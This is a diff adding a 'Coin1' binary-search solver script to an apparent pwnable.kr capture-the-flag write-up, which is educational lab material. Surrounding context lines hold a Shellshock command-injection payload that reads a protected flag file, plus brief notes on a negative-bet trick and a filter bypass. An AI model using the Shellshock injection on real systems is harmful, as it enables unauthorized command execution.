@@ -223,6 +223,60 @@ if we try to do `cat flag`, we'll see that it throws some kind of error.
 So I used this trick to see the flag:
 env x='() { :;}; echo $(<flag)' ./shellshock
 
+
+### Level 11 - Coin1
+
+Now we have a cool game:
+we are given with number of coins, and number of guesses.
+One of those coins is fake and its weight is 9kg while the others are 10kg, and we need to find this fake coin 100 times, in 60 seconds.
+We can find it by weighing series of coins, and get the total amount of kgs.
+When playing a bit with the program , I noticed that in every game, 2^C > N, so I thought solving it with binary search, so that I can find it in C tries.
+First of all I weighed the first half, if the odd one is in them, I know that it can't be in the other half, and I continued in this pattern.
+At the end I have found the fake coin, and sent it back to the server.
+I thought I was done, but my code was too slow, and it couldn't find the fake coin 100 times.
+So because communicating with a local computer in your subnet is really fast, 
+I ssh'ed into pwnable.kr using one of the ssh users from the previous challenges (for example fd), and then I ran my code in it.
+
+My code:
+
+```python
+import socket
+
+socket = socket.socket()  
+socket.connect(("127.0.0.1", 9007))  
+welcome_msg = socket.recv(2048)
+print(welcome_msg)
+
+for _ in range(0, 100):
+        msg = socket.recv(2048).decode()
+          
+        N, C = [int(i.split("=")[1]) for i in msg.split(" ")]
+             
+        low = 0
+        high = N - 1   
+        mid = (low + high) // 2
+            
+        for i in range(C):
+                mid = (low + high) // 2 
+                  
+                payload = " ".join([str(i) for i in range(low,  mid+1 )])
+                     
+                socket.sendall((payload + "\n").encode())
+                msg = socket.recv(1024).decode().replace("\n" , "")
+                    
+                if msg.isnumeric() and int(msg) % 10 == 0: #if its  divisible by 10 it means that the fake coin is in the other half
+                        low  = mid  + 1
+                else:   
+                        high = mid - 1 
+           
+        socket.sendall((str(low) + "\n").encode())
+        print(socket.recv(2048).decode())   
+
+print(socket.recv(2048).decode())
+print(socket.recv(2048).decode())
+```
+
+
 ### Level 12 - BlackJack
 
 In this challenge we have to be millionares.
@@ -251,7 +305,7 @@ Then once we lost, this following line gets called:
 but because bet is negetive, we get 100000000!
 And then when playing again we can see the flag!
 
-### Level 14 - Coin1
+### Level 14 - cmd1
 
 We have a c code which changes the path enviorment variable to /thankyouverymuch, filters our input, and run it.
 We would normally just do `./cmd1 "cat flag"`, but first of all we cant just run cat, cause we changed the enviroment variable, so we need to specify the whole path which is /bin/cat. the other problem is that the program filters any inputs which contains the word `flag`.
